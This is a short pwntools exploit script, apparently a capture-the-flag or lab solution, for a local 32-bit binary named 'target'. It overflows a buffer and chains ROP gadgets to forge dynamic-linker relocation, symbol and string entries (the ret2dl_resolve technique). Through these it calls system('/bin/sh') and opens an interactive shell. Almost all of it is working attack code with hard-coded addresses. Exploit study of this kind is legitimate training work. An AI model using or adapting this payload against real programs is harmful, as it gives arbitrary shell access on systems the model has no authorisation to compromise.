from pwn import *

r = process(["./target"])

#  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4
#  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1
#  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4
#  80482fb:       e9 d0 ff ff ff          jmp    80482d0 <_init+0x28>
#  80482e0 <read@plt>
#  0x080484a9 : pop esi ; pop edi ; pop ebp ; ret

rel_plt = 0x08048298
read = 0x80482e0
pop_3 = 0x080484a9
dl_resolve = 0x80482fb
dynsym = 0x080481cc
dynstr = 0x0804821c
rel_addr = 0x0804a100
rel_idx = 0x0804a100 - 0x08048298

dynsym_idx = (0x0804a10c-0x080481cc)/0x10
dynstr_idx =  0x0804a11c-0x0804821c
rel_val = flat([0x804a00c,dynsym_idx<<8|0x7,0x0,dynstr_idx,0x0,0x0,0x0],"system\x00\x00/bin/sh\x00")
payload = flat("a"*0x18,[0x0804ad00,read,0x080484a9,0x0,0x0804a100,len(rel_val),dl_resolve,rel_idx,0x1234,0x0804a124]).ljust(0x100,'\x00')+rel_val

r.send(payload)
r.interactive()





